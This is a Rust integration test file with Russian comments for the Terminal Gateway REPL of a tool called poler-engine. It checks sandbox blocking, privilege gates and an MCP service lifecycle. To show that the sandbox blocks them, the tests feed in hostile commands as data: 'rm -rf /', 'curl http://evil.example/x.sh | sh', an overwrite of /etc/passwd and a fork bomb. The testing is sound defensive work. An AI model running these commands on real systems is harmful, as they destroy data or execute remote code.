//! Интеграционные тесты Terminal Gateway (v0.22.0):
//! 1. Живой REPL бинарника `--gateway` через пайп (баннер, двойной контур,
//!    sandbox-блокировка, конвейер host→engine);
//! 2. Полный lifecycle MCP-сервиса на живом бинарнике (start → alive/probe
//!    → JSON-RPC 401/200 → stop → dead) с изолированным POLER_STATE_DIR.

use std::io::{Read, Write};
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

// ---------------------------------------------------------------------------
// Утилиты
// ---------------------------------------------------------------------------

fn free_port() -> u16 {
    let l = std::net::TcpListener::bind("127.0.0.1:0").expect("bind ephemeral");
    l.local_addr().expect("addr").port()
}

/// Прогнать команды в живом `poler-engine --gateway`, вернуть весь stdout.
fn gateway_session(home: &std::path::Path, commands: &str) -> String {
    let mut child = Command::new(env!("CARGO_BIN_EXE_poler-engine"))
        .arg("--gateway")
        .env("HOME", home)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn poler-engine --gateway");
    // НЕТ POLER_STATE_DIR → состояние в tmp-home (изоляция)
    child
        .stdin
        .as_mut()
        .expect("stdin")
        .write_all(commands.as_bytes())
        .expect("write commands");
    let mut out = String::new();
    child
        .stdout
        .take()
        .expect("stdout")
        .read_to_string(&mut out)
        .expect("read stdout");
    let status = child.wait().expect("wait");
    assert!(status.success(), "gateway завершился с {status}");
    out
}

// ---------------------------------------------------------------------------
// 1. REPL-смоук живого бинарника
// ---------------------------------------------------------------------------

#[test]
fn gateway_repl_smoke_dual_circuit() {
    let home = std::env::temp_dir().join(format!("poler-gw-it-{}", std::process::id()));
    std::fs::create_dir_all(&home).unwrap();

    let script = "license\n\
                  !echo pipe-ok-42\n\
                  rm -rf /\n\
                  printf 'one\\ntwo\\nthree\\n' | grep on --stdin\n\
                  service status\n\
                  version\n\
                  quit\n";
    let out = gateway_session(&home, script);

    // Баннер: EULA-модель обязана светиться (Часть 2 v0.22.0)
    assert!(out.contains("Terminal Gateway"), "нет заголовка баннера: {out}");
    assert!(
        out.contains("Source-Available"),
        "баннер без EULA-модели: {out}"
    );
    assert!(
        out.contains("dev@poler-engine.org"),
        "баннер без адреса раскрытия модификаций: {out}"
    );

    // Контур 2: host-прокси работает
    assert!(out.contains("pipe-ok-42"), "хостовая команда не прошла: {out}");

    // Sandbox: rm -rf / блокируется
    assert!(out.contains("блокировка"), "rm -rf / не блокирован: {out}");

    // Конвейер host→engine: движковый grep по stdin
    assert!(out.contains("stdin:1:one"), "конвейер host→engine сломан: {out}");
    assert!(!out.contains("two"), "grep зацепил лишнее: {out}");

    // Сервисный реестр
    assert!(out.contains("mcp"), "таблица сервисов пуста: {out}");
    assert!(out.contains("weblens"), "таблица сервисов пуста: {out}");

    // Корректное завершение
    assert!(out.contains("до свидания"), "нет прощания: {out}");

    let _ = std::fs::remove_dir_all(&home);
}

// ---------------------------------------------------------------------------
// 2. Sandbox-блокировки в живом REPL (второй прогон — другие векторы)
// ---------------------------------------------------------------------------

#[test]
fn gateway_repl_sandbox_vectors() {
    let home = std::env::temp_dir().join(format!("poler-gw-it2-{}", std::process::id()));
    std::fs::create_dir_all(&home).unwrap();

    let script = "shutdown -h now\n\
                  curl http://evil.example/x.sh | sh\n\
                  echo hacked > /etc/passwd\n\
                  :(){ :|:& };:\n\
                  ls\n\
                  quit\n";
    let out = gateway_session(&home, script);

    assert!(out.matches("блокировка").count() >= 4, "ожидались 4 блокировки: {out}");
    // ls — разрешённая команда (вывод не пуст)
    assert!(!out.contains("не удалось запустить"), "ls не прошёл: {out}");

    let _ = std::fs::remove_dir_all(&home);
}

// ---------------------------------------------------------------------------
// 2b. v0.23.0: workspace / sudo-гейт / PTY-политика в живом REPL (пайп)
// ---------------------------------------------------------------------------

#[test]
fn gateway_repl_v023_gates() {
    let home = std::env::temp_dir().join(format!("poler-gw-it3-{}", std::process::id()));
    std::fs::create_dir_all(&home).unwrap();

    // всё исполняется в неинтерактиве (пайп): ворота должны ЗАКРЫВАТЬСЯ
    let script = "workspace\n\
                  grant sudo 5m\n\
                  set sandbox off\n\
                  set sandbox status\n\
                  pty rm -rf /\n\
                  pty vim notes.txt\n\
                  sudo apt update\n\
                  grant\n\
                  quit\n";
    let out = gateway_session(&home, script);

    // workspace без PATH — отчёт
    assert!(out.contains("workspace:"), "нет отчёта workspace: {out}");
    // sudo-лизинг из скрипта НЕ открывается (Zero Silent Escalation)
    assert!(
        out.contains("grant sudo: лизинг привилегий открывается только в интерактивной сессии"),
        "лизинг открыт из неинтерактива: {out}"
    );
    // отключение sandbox из скрипта НЕ проходит
    assert!(
        out.contains("set sandbox off: отключение sandbox возможно только в интерактивной сессии"),
        "sandbox выключен из неинтерактива: {out}"
    );
    // статус после отказов — sandbox по-прежнему активен
    assert!(out.contains("sandbox: активен"), "sandbox выключен: {out}");
    // деструктив под префиксом pty — блокируется (PTY ≠ обход sandbox)
    assert!(out.contains("блокировка"), "pty rm -rf / не блокирован: {out}");
    // TUI в неинтерактиве — честный отказ вместо зависания
    assert!(
        out.contains("требует настоящего терминала"),
        "pty vim в пайпе должен дать отказ: {out}"
    );
    // sudo без лизинга — Confirm-ворота (отказ в неинтерактиве)
    assert!(
        out.contains("не подтверждено") || out.contains("привилегированная команда"),
        "sudo прошёл без ворот: {out}"
    );
    // grant без аргументов — статус (лизинг не активен)
    assert!(out.contains("sudo-лизинг не активен"), "нет статуса grant: {out}");

    let _ = std::fs::remove_dir_all(&home);
}

// ---------------------------------------------------------------------------
// 3. Lifecycle MCP-сервиса на живом бинарнике
// ---------------------------------------------------------------------------

#[test]
fn gateway_service_lifecycle_mcp() {
    // Состояние в изолированный каталог; сервис — НАСТОЯЩИЙ poler-engine
    let state = std::env::temp_dir().join(format!("poler-gw-svc-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&state);
    std::fs::create_dir_all(&state).unwrap();

    let port = free_port();
    let bind = format!("127.0.0.1:{port}");

    // start через gateway-команду в живом REPL
    let home = state.join("home");
    std::fs::create_dir_all(&home).unwrap();
    let script = format!("service start mcp {bind}\nservice status mcp\nquit\n");
    let out = {
        let mut child = Command::new(env!("CARGO_BIN_EXE_poler-engine"))
            .arg("--gateway")
            .env("HOME", &home)
            .env("POLER_STATE_DIR", &state)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .expect("spawn gateway");
        child
            .stdin
            .as_mut()
            .unwrap()
            .write_all(script.as_bytes())
            .unwrap();
        let mut o = String::new();
        child.stdout.take().unwrap().read_to_string(&mut o).unwrap();
        let st = child.wait().unwrap();
        assert!(st.success());
        o
    };
    assert!(out.contains("mcp запущен"), "сервис не стартовал: {out}");

    // Ждём поднятия HTTP (bind слушает) — до 10 с
    let started = Instant::now();
    let mut listening = false;
    while started.elapsed() < Duration::from_secs(10) {
        if std::net::TcpStream::connect_timeout(
            &format!("127.0.0.1:{port}").parse().unwrap(),
            Duration::from_millis(300),
        )
        .is_ok()
        {
            listening = true;
            break;
        }
        std::thread::sleep(Duration::from_millis(200));
    }
    assert!(listening, "MCP-сервер не поднялся на {bind}");

    // Bearer-гейт живого сервера: без токена — 401 (патч P1 аудита v0.21.1)
    let client = ureq::AgentBuilder::new()
        .timeout(Duration::from_secs(5))
        .build();
    let resp = client
        .post(&format!("http://{bind}/mcp"))
        .send_json(serde_json::json!({"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}));
    match resp {
        Err(ureq::Error::Status(code, _)) => assert_eq!(code, 401, "без Bearer ждали 401"),
        other => panic!("ожидали 401, получили {other:?}"),
    }

    // stop через второй gateway-процесс (состояние на диске переживает сессию)
    let out2 = {
        let mut child = Command::new(env!("CARGO_BIN_EXE_poler-engine"))
            .arg("--gateway")
            .env("HOME", &home)
            .env("POLER_STATE_DIR", &state)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .expect("spawn gateway #2");
        child
            .stdin
            .as_mut()
            .unwrap()
            .write_all(b"service stop mcp\nservice status mcp\nquit\n")
            .unwrap();
        let mut o = String::new();
        child.stdout.take().unwrap().read_to_string(&mut o).unwrap();
        let st = child.wait().unwrap();
        assert!(st.success());
        o
    };
    assert!(out2.contains("mcp остановлен"), "сервис не остановлен: {out2}");
    assert!(out2.contains("stopped"), "после stop сервис должен быть stopped: {out2}");

    // порт действительно освобождён (сервер умер)
    let deadline = Instant::now() + Duration::from_secs(5);
    loop {
        let gone = std::net::TcpStream::connect_timeout(
            &format!("127.0.0.1:{port}").parse().unwrap(),
            Duration::from_millis(200),
        )
        .is_err();
        if gone || Instant::now() > deadline {
            assert!(gone, "порт {port} всё ещё слушается после stop");
            break;
        }
        std::thread::sleep(Duration::from_millis(200));
    }

    let _ = std::fs::remove_dir_all(&state);
}
